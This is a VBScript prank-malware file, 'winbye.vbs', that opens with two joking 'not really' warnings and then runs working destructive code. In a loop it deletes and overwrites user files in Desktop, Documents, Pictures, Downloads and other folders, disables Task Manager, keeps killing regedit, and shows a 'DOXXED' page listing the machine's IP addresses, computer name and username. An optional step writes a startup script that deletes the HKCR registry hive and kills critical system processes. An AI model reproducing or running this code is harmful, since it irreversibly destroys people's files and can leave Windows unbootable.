warn = MsgBox("WARNING: This malware can destroy your computer (not really), are you sure you want to run the malware?", vbYesNo + vbQuestion, "winbye.vbs")

If warn = vbYes Then

warn2 = MsgBox("SECOND WARNING (for avoiding misclick): This malware can encrypt your files, doxx you, kill your pc (not really), disable task manager, force kill regedit on loop, are you actually sure to run the malware?", vbYesNo + vbQuestion, "winbye.vbs")
  
  If warn2 = vbYes Then
set shell = createobject("wscript.shell")

set fso = createobject("scripting.filesystemobject")

computer = "."

set network = createobject("wscript.network")

set wmi = getobject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & computer & "\root\cimv2")

set colItems = wmi.execquery("Select * From Win32_NetworkAdapterConfiguration Where IPEnabled = True")

function encryptfolder(flder) 
if fso.folderexists(flder) then
set folder = fso.getfolder(flder)

for each item in folder.files
    if not item.name = "HEAEHandxiDii.html" and not item.name = WScript.ScriptFullName and not item.name = "data.txt" and not item.name = "bro.png" then
    itembasename = fso.GetBaseName(item)
    
    encryptornot = fso.GetExtensionName(item.name) = "enc"
    
    if encryptornot = 0 then
        item.name = itembasename & ".enc"
    end if
    
    oldfile = folder & "\" & item.name
    
    fso.deletefile(oldfile)
    
    set nwfile = fso.createtextfile(oldfile, true)
    nwfile.writeline "all your files have been encrypted, goodbye file!"
    nwfile.close
    end if
    next
end if
end function

for each item in colItems
    for each ipAddress In item.IPAddress
        if instr(ipAddress, ":") > 0 Then
            ipv6 = ipAddress
        else
            ipv4 = ipAddress
        end if
    next
next

cmn = network.ComputerName
dm = network.UserDomain
un = network.UserName

set doxxfile = fso.createtextfile(shell.specialfolders("AppData") & "\HEAEHandxiDii.html")

doxxfile.writeline "<h1><span style=""color: red;"">D</span><span style=""color: orange;"">O</span><span style=""color: yellow;"">X</span><span style=""color: green;"">X</span><span style=""color: blue;"">E</span><span style=""color: purple;"">D</span></h1>"
doxxfile.writeline "<p>Ipv4: " & ipv4 & "</p>"
doxxfile.writeline "<p>Ipv6: " & ipv6 & "</p>"
doxxfile.writeline "<p>Computer Name: " & cmn & "</p>"
doxxfile.writeline "<p>Domain: " & dm & "</p>"
doxxfile.writeline "<p>Username: " & un & "</p>"
doxxfile.writeline "<p>Notice: I also encrypted your files forever, you can close this window. - Bill Gates</p>"
doxxfile.writeline "<button onclick=""killpc()"">Kill PC</button>"
doxxfile.writeline "<style>html { font-family: sans-serif; }</style>"
doxxfile.writeline "<script>function killpc() {const textContent = 'True'; const blob = new Blob([textContent], { type: 'text/plain' }); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = 'data.txt'; document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url);}</script>"

doxxfile.close

shell.run shell.specialfolders("AppData") & "\HEAEHandxiDii.html"

do
shell.RegWrite "HKEY_CURRENT_USER\Control Panel\Desktop\Wallpaper", fso.GetParentFolderName(WScript.ScriptFullName) & "\bro.png", "REG_SZ"
Call shell.Run("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters")
shell.run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f",0,True
shell.run "taskkill /f /im regedit.exe",0,True
encryptfolder shell.specialfolders("Desktop")
encryptfolder shell.specialfolders("AppData")
encryptfolder shell.ExpandEnvironmentStrings("%USERPROFILE%\Downloads")
encryptfolder shell.specialfolders("Music")
encryptfolder shell.specialfolders("Pictures")
encryptfolder shell.specialfolders("Documents")
encryptfolder shell.specialfolders("Videos")
if fso.fileexists(shell.ExpandEnvironmentStrings("%USERPROFILE%\Downloads") & "\data.txt") then
Set file = fso.OpenTextFile(shell.ExpandEnvironmentStrings("%USERPROFILE%\Downloads") & "\data.txt", 1) ' 1 = ForReading
    textLine = file.ReadLine
    if textLine = "True" then
        set startfl = fso.createtextfile(shell.specialfolders("Startup") & "\kill.bat", true)
        startfl.writeline "reg delete HKCR /f"
        startfl.close
        shell.run "taskkill /f /im wininit.exe",0,True
        shell.run "taskkill /f /im svchost.exe",0,True
    end if
end if
loop
elseif warn2 = vbNo Then
    WScript.Quit
end if
elseif warn1 = vbNo Then
    WScript.Quit
end if
